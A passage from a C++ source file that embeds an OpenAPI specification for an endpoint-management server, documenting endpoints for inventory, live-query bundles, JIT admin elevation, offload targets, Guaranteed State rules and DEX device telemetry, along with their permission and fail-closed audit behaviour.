      "post": {"summary": "Query inventory across agents with filter expression", "tags": ["Inventory"], "requestBody": {"required": true, "content": {"application/json": {"schema": {"type": "object", "properties": {"agent_id": {"type": "string", "description": "Filter by agent ID"}, "plugin": {"type": "string", "description": "Filter by plugin name"}, "since": {"type": "integer", "description": "Only records after this epoch"}, "until": {"type": "integer", "description": "Only records before this epoch"}, "limit": {"type": "integer", "default": 100}}}}}}, "responses": {"200": {"description": "Matching inventory records"}}}
    },
    "/inventory/software": {
      "get": {"summary": "Fleet-wide installed-software inventory (typed daily-sync store, ADR-0016)", "tags": ["Inventory"], "description": "Installed-software rows across the fleet from the typed SoftwareInventoryStore (DISTINCT from the generic /inventory/* routes, which read the generic blob store). Requires Inventory:Read. Results are scoped to the caller's management groups; out-of-scope devices are dropped and counted in devices_omitted (a positive value means matching software exists outside your scope — an empty/short result does NOT mean the software is absent fleet-wide). Capped at limit rows (max 1000); result_truncated_by_cap=true means more exist past the cap (keyset pagination is a follow-up). On store degradation the endpoint returns 503 (never an empty 200) so a vulnerability query cannot read a transient outage as 'installed nowhere'.", "parameters": [{"name": "name", "in": "query", "schema": {"type": "string"}, "description": "Exact software-name filter (optional)"}, {"name": "agent_id", "in": "query", "schema": {"type": "string"}, "description": "Exact agent filter (optional)"}, {"name": "limit", "in": "query", "schema": {"type": "integer", "default": 100, "maximum": 1000}}], "responses": {"200": {"description": "{data:{software[], count, devices_omitted, result_truncated_by_cap?, audit_persisted?}}"}, "400": {"description": "Non-integer limit"}, "401": {"description": "Unauthenticated"}, "403": {"description": "Requires Inventory:Read"}, "503": {"description": "Software inventory store unavailable or degraded"}}}
    },)json"
        // Split again (MSVC C2026 16,380-byte cap); concatenated at compile time.
        // NOTE: the preceding literal segment (incl. /inventory/software) is ~12 KB —
        // the NEXT path added to it will likely need its own `)json" R"json(` split.
        R"json(
    "/bundles": {
      "post": {"summary": "Dispatch a live-query bundle: fan one instruction into up to 32 plugin actions on one device (ADR-0011)", "tags": ["Bundles"], "requestBody": {"required": true, "content": {"application/json": {"schema": {"type": "object", "required": ["agent_id", "steps"], "properties": {"agent_id": {"type": "string", "description": "The single target device"}, "steps": {"type": "array", "minItems": 1, "maxItems": 32, "items": {"type": "object", "required": ["plugin", "action"], "properties": {"plugin": {"type": "string"}, "action": {"type": "string"}, "params": {"type": "object", "additionalProperties": {"type": "string"}}}}}}}}}}, "responses": {"202": {"description": "Accepted; returns {bundle_id, agent_id, expected}. Poll GET /bundles/{id} to collate."}, "400": {"description": "Invalid JSON, missing/empty agent_id, missing/empty steps, >32 steps, unsafe identifier, or param size caps"}, "403": {"description": "Requires Execution:Execute"}, "500": {"description": "Authenticated session has no principal"}, "503": {"description": "Dispatch unavailable"}}}
    },
    "/bundles/{id}": {
      "get": {"summary": "Collate a dispatched bundle", "tags": ["Bundles"], "parameters": [{"name": "id", "in": "path", "required": true, "schema": {"type": "string", "pattern": "^bundle-[a-f0-9]+$"}}], "responses": {"200": {"description": "Server-grouped {complete, received, succeeded, expected, steps[]} in request order. complete is terminal, NOT success — check succeeded==expected. Invalid-UTF-8 bytes in step output are replaced with U+FFFD."}, "403": {"description": "Requires Response:Read"}, "404": {"description": "Not found, expired, or not owned (no enumeration oracle)"}, "503": {"description": "Service unavailable"}}}
    },
    "/users/{username}/unlock": {
      "post": {"summary": "Clear a user's account-lockout counter (admin unlock, SOC 2 CC6.3)", "tags": ["Users"], "parameters": [{"name": "username", "in": "path", "required": true, "schema": {"type": "string"}}], "responses": {"200": {"description": "Lockout cleared: {username, unlocked, audit_emitted}"}, "400": {"description": "Username empty or malformed"}, "403": {"description": "Requires UserManagement:Write (and MFA step-up when enrolled)"}, "500": {"description": "auth.db write failed"}, "503": {"description": "Lockout subsystem unavailable (no auth.db / --data-dir)"}}}
    },
    "/users/{username}/elevation-eligibility": {
      "post": {"summary": "Grant or revoke a user's JIT-admin-elevation eligibility (SOC 2 CC6.3/CC6.6)", "tags": ["Users"], "description": "Admin (or an active elevation) + MFA step-up. Sets the per-user users.elevation_eligible flag. Self-grant is blocked. Setting eligible=false also terminates any in-flight elevation for that user. Errors use the A4 envelope (correlation_id + remediation).", "parameters": [{"name": "username", "in": "path", "required": true, "schema": {"type": "string"}}], "requestBody": {"required": true, "content": {"application/json": {"schema": {"type": "object", "required": ["eligible"], "properties": {"eligible": {"type": "boolean"}}}}}}, "responses": {"200": {"description": "{status: ok}"}, "400": {"description": "Invalid username or non-boolean body"}, "401": {"description": "Not authenticated"}, "403": {"description": "Not admin, MFA step-up refused, or self-grant"}, "404": {"description": "User not found"}, "503": {"description": "No auth.db (--data-dir unset)"}}}
    },
    "/elevate": {
      "post": {"summary": "Activate a time-boxed JIT admin elevation on the current cookie session (SOC 2 CC6.3/CC6.6)", "tags": ["Authentication"], "description": "Cookie session only (API/MCP tokens get 401 and can never elevate). Caller must be elevation_eligible, have MFA enrolled (mandatory regardless of --mfa-enforcement), and pass a fresh MFA step-up. duration_secs defaults to and is clamped by --jit-max-elevation-secs; a negative value is 400. The grant audit is fail-closed. Errors use the A4 envelope.", "requestBody": {"required": true, "content": {"application/json": {"schema": {"type": "object", "required": ["justification"], "properties": {"justification": {"type": "string", "description": "Required, non-empty; control bytes sanitised; truncated to 1 KiB at a UTF-8 code-point boundary"}, "duration_secs": {"type": "integer", "minimum": 1}}}}}}, "responses": {"200": {"description": "{status: ok, expires_in}"}, "400": {"description": "Blank/missing justification, wrong-typed field, or negative duration"}, "401": {"description": "Not authenticated, no cookie (token caller), or session dissolved mid-request"}, "403": {"description": "Not eligible, eligibility read failed, or no MFA enrolled"}, "500": {"description": "Grant audit unrecordable — elevation rolled back (Sec-Audit-Failed header)"}, "503": {"description": "No auth.db"}}}
    },
    "/elevate/revoke": {
      "post": {"summary": "Step an active JIT elevation down early", "tags": ["Authentication"], "description": "Cookie session only; no MFA step-up (reduces privilege). Always 200; whether a window was active is recorded in the role.elevation.revoked audit detail.", "responses": {"200": {"description": "{status: ok}"}, "401": {"description": "Not authenticated"}}}
    },
    "/openapi.json": {
      "get": {"summary": "OpenAPI 3.0 specification", "tags": ["Documentation"], "security": [], "responses": {"200": {"description": "OpenAPI 3.0 JSON spec"}}}
    },)json"
        // Split: keep each raw-string literal under MSVC's 16,380-byte C2026 cap
        // (adjacent literals concatenate; emitted OpenAPI JSON is byte-identical).
        R"json(
    "/offload-targets": {
      "get": {"summary": "List configured offload targets", "tags": ["Offload"], "description": "Requires Infrastructure:Read. Returns every registered offload target. The auth_credential is never returned in any response (issue #255, Phase 8.3).", "responses": {"200": {"description": "List of offload targets"}, "503": {"description": "Offload store unavailable"}}},
      "post": {"summary": "Create an offload target", "tags": ["Offload"], "description": "Requires Infrastructure:Write. Validation: URL must be http(s)://, name must be non-empty and unique, batch_size must be >= 1, auth_credential must not contain control bytes (defends against Authorization header CRLF injection).", "requestBody": {"required": true, "content": {"application/json": {"schema": {"type": "object", "required": ["name", "url"], "properties": {"name": {"type": "string", "description": "Unique stable identifier referenced from spec.offload.targets"}, "url": {"type": "string", "description": "http:// or https:// POST endpoint"}, "auth_type": {"type": "string", "enum": ["none", "bearer", "basic", "hmac"], "default": "none"}, "auth_credential": {"type": "string", "description": "Bearer token, user:pass, or shared HMAC secret. Never returned by any read endpoint."}, "event_types": {"type": "string", "default": "*", "description": "Comma-separated event names or *"}, "batch_size": {"type": "integer", "minimum": 1, "default": 1}, "enabled": {"type": "boolean", "default": true}}}}}}, "responses": {"201": {"description": "Target created"}, "400": {"description": "Invalid JSON, missing name/url, bad URL scheme, control bytes in credential, batch_size < 1, or duplicate name"}, "503": {"description": "Offload store unavailable"}}}
    },
    "/offload-targets/{id}": {
      "get": {"summary": "Get a single offload target", "tags": ["Offload"], "description": "Requires Infrastructure:Read. auth_credential is never returned.", "parameters": [{"name": "id", "in": "path", "required": true, "schema": {"type": "integer"}}], "responses": {"200": {"description": "Offload target"}, "404": {"description": "Target not found"}, "503": {"description": "Offload store unavailable"}}},
      "delete": {"summary": "Delete an offload target", "tags": ["Offload"], "description": "Requires Infrastructure:Write. Cascades on offload_deliveries; pending buffered events are dropped. Successful deletes audit offload_target.delete/success; 404 paths audit offload_target.delete/denied with detail=not_found.", "parameters": [{"name": "id", "in": "path", "required": true, "schema": {"type": "integer"}}], "responses": {"200": {"description": "Target deleted"}, "404": {"description": "Target not found (or numeric overflow on path segment)"}, "503": {"description": "Offload store unavailable"}}}
    },
    "/offload-targets/{id}/deliveries": {
      "get": {"summary": "List recent offload delivery attempts", "tags": ["Offload"], "description": "Requires Infrastructure:Read. limit query parameter is clamped to [1, 1000]; default 50.", "parameters": [{"name": "id", "in": "path", "required": true, "schema": {"type": "integer"}}, {"name": "limit", "in": "query", "required": false, "schema": {"type": "integer", "minimum": 1, "maximum": 1000, "default": 50}}], "responses": {"200": {"description": "List of delivery records"}, "404": {"description": "Target not found (deleted, never created, or numeric overflow on id)"}, "503": {"description": "Offload store unavailable"}}}
    },
    "/executions/{id}/visualization": {
      "get": {"summary": "Render execution responses as chart-ready JSON", "tags": ["Executions"], "description": "Requires Response:Read. The definition_id query parameter is required and must match [A-Za-z0-9._-]+. Returns chart data shaped by the spec.visualization (or spec.visualizations) block on the InstructionDefinition (see yaml-dsl-spec.md). When a definition declares multiple charts, use the optional index query parameter to select among them; default 0. The response payload includes chart_index and chart_count fields so callers can iterate. Caps the underlying response read at 10000 rows; when the cap is hit the payload includes rows_capped:true and rows_cap:10000. Emits an execution.visualization.fetch audit event on every invocation.", "parameters": [{"name": "id", "in": "path", "required": true, "schema": {"type": "string"}}, {"name": "definition_id", "in": "query", "required": true, "schema": {"type": "string"}}, {"name": "index", "in": "query", "required": false, "schema": {"type": "integer", "minimum": 0, "default": 0}, "description": "Chart index when the definition declares multiple visualizations."}], "responses": {"200": {"description": "Chart data payload"}, "400": {"description": "definition_id not provided or index is not a non-negative integer"}, "404": {"description": "Definition not found, no visualization configured, or index out of range"}, "500": {"description": "Visualization spec is invalid"}, "503": {"description": "Service unavailable"}}}
    },
    "/definitions/{id}/response-templates": {
      "get": {"summary": "List response templates for an InstructionDefinition", "tags": ["Definitions"], "description": "Requires InstructionDefinition:Read. Returns the operator-authored templates plus a synthesised __default__ template (auto-prepended when no operator template is marked default). The synthesised default lists columns from spec.result.columns when populated, otherwise from the plugin's column schema (issue #254, Phase 8.2).", "parameters": [{"name": "id", "in": "path", "required": true, "schema": {"type": "string", "pattern": "^[A-Za-z0-9._-]{1,128}$"}}], "responses": {"200": {"description": "List of response templates"}, "400": {"description": "Malformed definition id"}, "404": {"description": "Definition not found"}, "503": {"description": "Service unavailable"}}},
      "post": {"summary": "Create a response template", "tags": ["Definitions"], "description": "Requires InstructionDefinition:Write. Body is a single template object. Reserved id __default__ is rejected. Body size capped at 64 KiB.", "parameters": [{"name": "id", "in": "path", "required": true, "schema": {"type": "string", "pattern": "^[A-Za-z0-9._-]{1,128}$"}}], "requestBody": {"required": true, "content": {"application/json": {"schema": {"$ref": "#/components/schemas/ResponseTemplate"}}}}, "responses": {"201": {"description": "Template created"}, "400": {"description": "Invalid JSON / validation failure / reserved id"}, "404": {"description": "Definition not found"}, "413": {"description": "Body exceeds 64 KiB cap"}, "500": {"description": "Persist failure"}, "503": {"description": "Service unavailable"}}}
    },
    "/definitions/{id}/response-templates/{template_id}": {
      "get": {"summary": "Get a response template", "tags": ["Definitions"], "description": "Requires InstructionDefinition:Read. The reserved id __default__ always returns the synthesised default.", "parameters": [{"name": "id", "in": "path", "required": true, "schema": {"type": "string", "pattern": "^[A-Za-z0-9._-]{1,128}$"}}, {"name": "template_id", "in": "path", "required": true, "schema": {"type": "string", "pattern": "^[A-Za-z0-9_-]{1,64}$"}}], "responses": {"200": {"description": "Template"}, "400": {"description": "Malformed id"}, "404": {"description": "Definition or template not found"}, "503": {"description": "Service unavailable"}}},
      "put": {"summary": "Replace a response template in place", "tags": ["Definitions"], "description": "Requires InstructionDefinition:Write. PUT against template_id=__default__ returns 400 (synthesised default cannot be overwritten). Body size capped at 64 KiB.", "parameters": [{"name": "id", "in": "path", "required": true, "schema": {"type": "string"}}, {"name": "template_id", "in": "path", "required": true, "schema": {"type": "string"}}], "requestBody": {"required": true, "content": {"application/json": {"schema": {"$ref": "#/components/schemas/ResponseTemplate"}}}}, "responses": {"200": {"description": "Template replaced"}, "400": {"description": "Reserved id / malformed / invalid JSON / validation failure"}, "404": {"description": "Definition or template not found"}, "413": {"description": "Body exceeds 64 KiB cap"}, "500": {"description": "Persist failure"}, "503": {"description": "Service unavailable"}}},
      "delete": {"summary": "Delete a response template", "tags": ["Definitions"], "description": "Requires InstructionDefinition:Write. Reserved id __default__ cannot be deleted (returns 400).", "parameters": [{"name": "id", "in": "path", "required": true, "schema": {"type": "string"}}, {"name": "template_id", "in": "path", "required": true, "schema": {"type": "string"}}], "responses": {"200": {"description": "Template removed"}, "400": {"description": "Malformed id or reserved id"}, "404": {"description": "Definition or template not found"}, "500": {"description": "Persist failure"}, "503": {"description": "Service unavailable"}}}
    })json"
        // Split here so each raw-string literal stays under MSVC's 16,380-byte
        // C2026 cap. Adjacent string literals are concatenated at compile time,
        // so the emitted OpenAPI JSON is byte-identical to the unsplit form.
        R"json(,
    "/guaranteed-state/rules": {
      "get": {"summary": "List Guaranteed State rules", "tags": ["Guaranteed State"], "description": "Requires GuaranteedState:Read.", "responses": {"200": {"description": "List of rules", "content": {"application/json": {"schema": {"type": "array", "items": {"$ref": "#/components/schemas/GuaranteedStateRule"}}}}}, "503": {"description": "service unavailable"}}},
      "post": {"summary": "Create a Guaranteed State rule", "tags": ["Guaranteed State"], "description": "Requires GuaranteedState:Write. rule_id must match [A-Za-z0-9._-]+. Structured authoring: pass spark/assertion/remediation {type, params} blocks; remediation.params resilience policy is validated (mode persist|backoff|bounded + bounds). Validation failures use the A4 error envelope.", "requestBody": {"required": true, "content": {"application/json": {"schema": {"$ref": "#/components/schemas/GuaranteedStateRule"}}}}, "responses": {"201": {"description": "Rule created"}, "400": {"description": "Missing required fields, invalid JSON, or invalid resilience params"}, "409": {"description": "Conflicting rule_id or name"}, "503": {"description": "service unavailable"}}}
    },
    "/guaranteed-state/schemas": {
      "get": {"summary": "Guard authoring schema registry", "tags": ["Guaranteed State"], "description": "Requires GuaranteedState:Read. Static catalog of spark/assertion/remediation types with per-type JSON Schemas (discriminated subschemas for value-dependent formats; resilience policy subschema for remediation). Cacheable via ETag/If-None-Match (304).", "responses": {"200": {"description": "Schema catalog"}, "304": {"description": "Not modified (ETag matched)"}}}
    },
    "/guaranteed-state/rules/{rule_id}": {
      "get": {"summary": "Get a Guaranteed State rule", "tags": ["Guaranteed State"], "description": "Requires GuaranteedState:Read.", "parameters": [{"name": "rule_id", "in": "path", "required": true, "schema": {"type": "string"}}], "responses": {"200": {"description": "Rule", "content": {"application/json": {"schema": {"$ref": "#/components/schemas/GuaranteedStateRule"}}}}, "404": {"description": "Rule not found"}}},
      "put": {"summary": "Update a Guaranteed State rule", "tags": ["Guaranteed State"], "description": "Requires GuaranteedState:Write. Version is incremented on every successful update.", "parameters": [{"name": "rule_id", "in": "path", "required": true, "schema": {"type": "string"}}], "requestBody": {"required": true, "content": {"application/json": {"schema": {"$ref": "#/components/schemas/GuaranteedStateRule"}}}}, "responses": {"200": {"description": "Rule updated"}, "400": {"description": "Invalid JSON"}, "404": {"description": "Rule not found"}, "409": {"description": "Conflicting name"}}},
      "delete": {"summary": "Delete a Guaranteed State rule", "tags": ["Guaranteed State"], "description": "Requires GuaranteedState:Delete.", "parameters": [{"name": "rule_id", "in": "path", "required": true, "schema": {"type": "string"}}], "responses": {"200": {"description": "Rule deleted"}, "404": {"description": "Rule not found"}}}
    },
    "/guaranteed-state/push": {
      "post": {"summary": "Queue a Guaranteed State rule push to agents", "tags": ["Guaranteed State"], "description": "Requires GuaranteedState:Push. Returns 202 Accepted — agent delivery is asynchronous. The server resolves the scope and delivers each in-scope agent a per-agent filtered rule set (os_target + scope_expr).", "requestBody": {"content": {"application/json": {"schema": {"type": "object", "properties": {"scope": {"type": "string", "description": "Scope DSL selector (empty = all agents)"}, "full_sync": {"type": "boolean", "default": false}}}}}}, "responses": {"202": {"description": "Push queued"}, "400": {"description": "Invalid JSON body"}, "503": {"description": "service unavailable"}}}
    },
    "/guaranteed-state/events": {
      "get": {"summary": "Query Guaranteed State events", "tags": ["Guaranteed State"], "description": "Requires GuaranteedState:Read. Limit is capped at 1000 at the REST boundary. An agent-scoped query (non-empty agent_id) returns that device's individual-identifying behavioural signal history and emits a dex.device.view audit before serving; it FAILS CLOSED — 503 + Sec-Audit-Failed: true (retryable, A4 envelope with retry_after_ms) — if that audit row cannot persist, parity with GET /api/v1/dex/devices/{id}. A query with no agent_id is a bulk operational query, not individually audited.", "parameters": [{"name": "rule_id", "in": "query", "schema": {"type": "string"}}, {"name": "agent_id", "in": "query", "schema": {"type": "string"}}, {"name": "severity", "in": "query", "schema": {"type": "string"}}, {"name": "limit", "in": "query", "schema": {"type": "integer", "default": 100, "maximum": 1000}}, {"name": "offset", "in": "query", "schema": {"type": "integer", "default": 0}}], "responses": {"200": {"description": "Matching events", "content": {"application/json": {"schema": {"type": "array", "items": {"$ref": "#/components/schemas/GuaranteedStateEvent"}}}}}, "400": {"description": "Invalid limit or offset"}, "503": {"description": "Audit row could not persist on an agent-scoped query — behavioural data withheld; carries Sec-Audit-Failed: true and is retryable (A4 envelope).", "headers": {"Sec-Audit-Failed": {"schema": {"type": "string", "enum": ["true"]}, "description": "Present when behavioural-PII was withheld because the access-audit row failed to persist."}}}}}
    },
    "/guaranteed-state/status": {
      "get": {"summary": "Fleet Guaranteed State status rollup", "tags": ["Guaranteed State"], "description": "Requires GuaranteedState:Read. PR 2 returns a placeholder with zero compliant/drifted/errored counts; real fleet aggregation lands in Guardian PR 4.", "responses": {"200": {"description": "Status rollup", "content": {"application/json": {"schema": {"$ref": "#/components/schemas/GuaranteedStateStatus"}}}}}}
    },
    "/guaranteed-state/status/{agent_id}": {
      "get": {"summary": "Per-agent Guaranteed State status", "tags": ["Guaranteed State"], "description": "Requires GuaranteedState:Read. Placeholder — per-agent aggregation lands in Guardian PR 4.", "parameters": [{"name": "agent_id", "in": "path", "required": true, "schema": {"type": "string"}}], "responses": {"200": {"description": "Agent status"}}}
    },
    "/guaranteed-state/device-compliance": {
      "get": {"summary": "Name-anchored, device-applicable Guardian compliance", "tags": ["Guaranteed State"], "description": "Requires GuaranteedState:Read, per-device scoped (global grant passes fleet-wide; otherwise the caller must hold Read via a management group the device is in). Looks up the Baseline by NAME (a stable constant such as 'ServiceNow Compliance', not a churning baseline_id) and returns the Guards ACTUALLY APPLICABLE to this device, each with the device's last reported (Observe-mode) verdict. One Baseline carries a SUPERSET of Guards, each scoped via scope_expr so the push arms a different subset per machine; the denominator here is the deployed_snapshot intersected with the Guards this device has reported, so an out-of-scope Guard is absent and each machine shows only its own applicable Guards. total_guards is that applicable count, not the snapshot size. A not-deployed Baseline returns deployed:false with empty guards (consumer renders 'No Baseline Deployed'). updated_at carries staleness. Audited as guardian.device.view (success/not_found); a behavioral-PII read, so it FAILS CLOSED (503 + Sec-Audit-Failed) if the audit row cannot persist — parity with GET /dex/devices/{id}. Honest in-scope-but-unreported 'pending' (per-device scope_expr evaluation) is a deferred upgrade.", "parameters": [{"name": "baseline", "in": "query", "required": true, "schema": {"type": "string"}, "description": "Baseline NAME (unique). URL-encode spaces, e.g. ServiceNow%20Compliance."}, {"name": "agent_id", "in": "query", "required": true, "schema": {"type": "string"}}], "responses": {"200": {"description": "Per-device applicable baseline status", "content": {"application/json": {"schema": {"$ref": "#/components/schemas/GuaranteedStateDeviceComplianceStatus"}}}}, "400": {"description": "Missing baseline/agent_id, over-length query parameter, or a parameter containing control characters (bytes < 0x20) (A4 envelope)", "content": {"application/json": {"schema": {"$ref": "#/components/schemas/A4ErrorEnvelope"}}}}, "403": {"description": "Caller lacks GuaranteedState:Read on the device's scope — auth/RBAC-layer denial body, not the A4 envelope; exact shape varies by denial reason (RBAC vs service-scope)"}, "404": {"description": "Baseline name not found (A4 envelope)", "content": {"application/json": {"schema": {"$ref": "#/components/schemas/A4ErrorEnvelope"}}}}, "503": {"description": "Either the route is misconfigured (stores / scoped-permission fn unwired — non-transient, do not retry) OR the guardian.device.view audit row could not persist so the read is refused without durable evidence (FAIL-CLOSED, CC7.2 — transient: Sec-Audit-Failed: true + retry_after_ms, retry after the audit subsystem recovers). A4 envelope.", "headers": {"Sec-Audit-Failed": {"schema": {"type": "string", "enum": ["true"]}, "description": "Present when the read was refused because the audit row could not persist (CC7.2 fail-closed); retry after the audit subsystem recovers."}}, "content": {"application/json": {"schema": {"$ref": "#/components/schemas/A4ErrorEnvelope"}}}}}}
    },
    "/guaranteed-state/alerts": {
      "get": {"summary": "Guaranteed State alerts", "tags": ["Guaranteed State"], "description": "Requires GuaranteedState:Read. Placeholder — alert aggregation lands in Guardian PR 11.", "responses": {"200": {"description": "Alerts list (empty in PR 2)"}}}
    },
    "/events": {
      "get": {"summary": "Subscribe to per-execution live events (JSON SSE)", "tags": ["Events"], "description": "Authenticated agentic-first JSON Server-Sent Events channel (sprint W5.1). Requires Execution:Read. Reuses the per-execution ExecutionEventBus that backs the dashboard /sse/executions/{id} route. Each SSE frame carries an `id:`, `event:` (one of `agent-transition`, `execution-progress`, `execution-completed`, plus the synthetic `replay-gap` / `events-dropped` / `heartbeat`), and a JSON `data:` payload conforming to ExecutionSseEvent. Reconnect via `Last-Event-ID` request header OR `?since=<event_id>` query (query wins). Non-integer `?since` values silently degrade to 0 (no replay). On reconnect after the per-execution ring buffer has evicted older events (FIFO, ~1000 events / ~30s window), a synthetic `replay-gap` frame is emitted as the first event so the worker knows state may be inconsistent. A slow consumer that lets the per-connection queue fill receives a synthetic `events-dropped` envelope summarising the drop count rather than silent OOM growth. Errors use the A4 envelope (ErrorEnvelope schema). Response headers always include X-Correlation-Id; Sec-Audit-Failed: true is set when audit persistence fails (CC6.6 contract).", "parameters": [{"name": "execution_id", "in": "query", "required": true, "schema": {"type": "string", "pattern": "^[A-Za-z0-9_-]{1,128}$"}, "description": "Execution to subscribe to. Unfiltered subscription is reserved for sprint W5.2."}, {"name": "since", "in": "query", "schema": {"type": "integer", "minimum": 0}, "description": "Replay events with id > since. Overrides Last-Event-ID header. Non-integer values silently degrade to 0."}, {"name": "Last-Event-ID", "in": "header", "schema": {"type": "string"}, "description": "Browser EventSource auto-reconnect header. Ignored when `since` is set."}], "responses": {"200": {"description": "SSE stream. Content-Type: text/event-stream. Each `data:` line is an ExecutionSseEvent.", "headers": {"X-Correlation-Id": {"schema": {"type": "string"}}, "Sec-Audit-Failed": {"schema": {"type": "string", "enum": ["true"]}, "description": "Present when audit row persistence failed; subscription still proceeds (CC6.6 evidence chain)."}}, "content": {"text/event-stream": {"schema": {"$ref": "#/components/schemas/ExecutionSseEvent"}}}}, "400": {"description": "Missing or malformed execution_id", "content": {"application/json": {"schema": {"$ref": "#/components/schemas/A4ErrorEnvelope"}}}}, "401": {"description": "Authentication required"}, "403": {"description": "Insufficient permission (Execution:Read)"}, "404": {"description": "Execution not found", "content": {"application/json": {"schema": {"$ref": "#/components/schemas/A4ErrorEnvelope"}}}}, "410": {"description": "Execution already terminal — subscribe-time stream is no longer available", "content": {"application/json": {"schema": {"$ref": "#/components/schemas/A4ErrorEnvelope"}}}}, "503": {"description": "Tracker or event bus not initialised; envelope includes retry_after_ms.", "content": {"application/json": {"schema": {"$ref": "#/components/schemas/A4ErrorEnvelope"}}}}}}
    },
    "/executions/{id}": {
      "get": {"summary": "Fetch the final state of a single execution (#1088)", "tags": ["Events"], "description": "Companion to GET /api/v1/events: when the SSE subscribe returns 410 (execution already terminal), the worker calls this endpoint to fetch the final state in one round-trip. Mirrors the dashboard /fragments/executions/{id}/detail data but JSON-shaped. Requires Execution:Read.", "parameters": [{"name": "id", "in": "path", "required": true, "schema": {"type": "string", "pattern": "^[A-Za-z0-9_-]{1,128}$"}}], "responses": {"200": {"description": "Final execution state", "headers": {"X-Correlation-Id": {"schema": {"type": "string"}}}}, "401": {"description": "Authentication required"}, "403": {"description": "Insufficient permission (Execution:Read)"}, "404": {"description": "Execution not found", "content": {"application/json": {"schema": {"$ref": "#/components/schemas/A4ErrorEnvelope"}}}}, "503": {"description": "Execution tracker not initialised; envelope includes retry_after_ms.", "content": {"application/json": {"schema": {"$ref": "#/components/schemas/A4ErrorEnvelope"}}}}}}
    })json"
        // Fresh literal split (MSVC C2026 16,380-byte cap) before the DEX block.
        R"json(,
    "/dex/signals": {
      "get": {"summary": "DEX catalogue rollup — every signal in the window", "tags": ["DEX"], "description": "Requires GuaranteedState:Read. Machine-readable equivalent of the DEX dashboard catalogue: each entry is one observation type (obs_type) present in the window, with its event count, blast radius (distinct_devices) and last_seen. Fleet aggregate — NOT audited. The window query parameter is one of 24h/7d/30d/all (default 7d; any other value resolves to 7d).", "parameters": [{"name": "window", "in": "query", "required": false, "schema": {"type": "string", "enum": ["24h", "7d", "30d", "all"], "default": "7d"}}], "responses": {"200": {"description": "Per-signal rollup array (data[].obs_type, count, distinct_devices, last_seen)"}, "503": {"description": "service unavailable"}}}
    },
    "/dex/scope": {
      "get": {"summary": "DEX per-OS signal coverage", "tags": ["DEX"], "description": "Requires GuaranteedState:Read. How many distinct obs_types each platform reports in the window, with total event count — the live cross-OS coverage the dashboard derives. Fleet aggregate — NOT audited.", "parameters": [{"name": "window", "in": "query", "required": false, "schema": {"type": "string", "enum": ["24h", "7d", "30d", "all"], "default": "7d"}}], "responses": {"200": {"description": "Per-OS scope array (data[].platform, distinct_types, total_events)"}, "503": {"description": "service unavailable"}}}
    },
    "/dex/signals/{obs_type}": {
      "get": {"summary": "DEX per-signal drill-down", "tags": ["DEX"], "description": "Requires GuaranteedState:Read. One obs_type's drill-down: top subjects, per-OS split, most-affected devices, and the per-day trend. The devices array names the agent_ids exhibiting this signal (individual-identifying behavioral data), so every call emits a dex.signal.view audit event — parity with the dashboard per-signal view and the agent_id-filtered events query. obs_type must match [A-Za-z0-9._-]{1,64} (a malformed value returns 400); a well-formed obs_type with no observations in the window returns 200 with empty arrays. FAILS CLOSED (503 + Sec-Audit-Failed: true header) when the dex.signal.view audit row cannot persist, so the device list is never served without durable evidence.", "parameters": [{"name": "obs_type", "in": "path", "required": true, "schema": {"type": "string", "pattern": "^[A-Za-z0-9._-]{1,64}$"}}, {"name": "window", "in": "query", "required": false, "schema": {"type": "string", "enum": ["24h", "7d", "30d", "all"], "default": "7d"}}, {"name": "limit", "in": "query", "required": false, "schema": {"type": "integer", "default": 50, "maximum": 500}, "description": "Caps the subjects[] and devices[] arrays; clamped to 500."}], "responses": {"200": {"description": "Drill-down object (obs_type, subjects[], by_os[], devices[], by_day[])"}, "400": {"description": "Invalid obs_type or limit"}, "503": {"description": "Service unavailable OR the dex.signal.view audit row could not persist (the latter carries Sec-Audit-Failed: true).", "headers": {"Sec-Audit-Failed": {"schema": {"type": "string", "enum": ["true"]}, "description": "Present when behavioural-PII was withheld because the access-audit row failed to persist."}}}}}
    },
    "/dex/devices/{id}": {
      "get": {"summary": "Per-device DEX read model", "tags": ["DEX"], "description": "Requires GuaranteedState:Read, scoped to the device's management group (parity with the dashboard device DEX lens). Returns this device's DEX experience score (0-100; -1 = n/a) and its signal summary for the window. Individual-identifying behavioral data, so every call emits a dex.device.view audit event. FAILS CLOSED (503 + Sec-Audit-Failed: true header) when that audit row cannot persist, so the device's behavioural data is never served without durable evidence. The window query parameter is one of 24h/7d/30d/all (default 7d).", "parameters": [{"name": "id", "in": "path", "required": true, "schema": {"type": "string"}}, {"name": "window", "in": "query", "required": false, "schema": {"type": "string", "enum": ["24h", "7d", "30d", "all"], "default": "7d"}}], "responses": {"200": {"description": "Per-device DEX object (agent_id, window, score, signals[].obs_type/count/distinct_devices/last_seen)"}, "400": {"description": "invalid window (expected 24h|7d|30d|all)"}, "403": {"description": "outside the caller's management scope"}, "503": {"description": "Service unavailable OR the dex.device.view audit row could not persist (the latter carries Sec-Audit-Failed: true).", "headers": {"Sec-Audit-Failed": {"schema": {"type": "string", "enum": ["true"]}, "description": "Present when behavioural-PII was withheld because the access-audit row failed to persist."}}}}}
    },
    "/dex/devices/{id}/live": {
      "post": {"summary": "Live device read (uptime / running processes)", "tags": ["DEX"], "description": "Requires GuaranteedState:Read AND Execution:Execute, scoped to the device's management group. POST (not GET) because it DISPATCHES a read-only plugin instruction to the device NOW (a side effect; not cached heartbeat data) and returns the result as JSON — the machine-readable equivalent of the dashboard 'Get live info' panel. kind=uptime returns {kind, uptime_display, uptime_seconds}; kind=processes returns {kind, processes[].pid/name/sha256/path} (the SHA-256 is of each on-disk executable). SYNCHRONOUS: the call blocks until the device responds or times out (~20s). The request is audited per kind (device.live.uptime / device.live.processes) with result=requested BEFORE the command is dispatched; if the audit row cannot persist the request is rejected with 503 + Sec-Audit-Failed: true and NO command is dispatched (audit-on-open, fail-closed). Concurrent live polls are capped server-wide (over-budget → 429); a slow device returns 504, an offline device 503, both with retry_after_ms. This is the INTERACTIVE, single-device probe — NOT the fleet-scale path. To read many devices at once, dispatch to a scope via the async execution surface and collect by execution_id; do NOT fan a synchronous /live call out across the fleet (the cap will reject it by design).", "parameters": [{"name": "id", "in": "path", "required": true, "schema": {"type": "string"}}, {"name": "kind", "in": "query", "required": true, "schema": {"type": "string", "enum": ["uptime", "processes"]}}], "responses": {"200": {"description": "Live result object (data.kind + uptime fields or processes[])"}, "400": {"description": "unknown kind"}, "403": {"description": "outside the caller's management scope, or missing Execute"}, "429": {"description": "too many concurrent live queries; retry after retry_after_ms"}, "502": {"description": "the device reported an error or the query failed"}, "503": {"description": "device offline 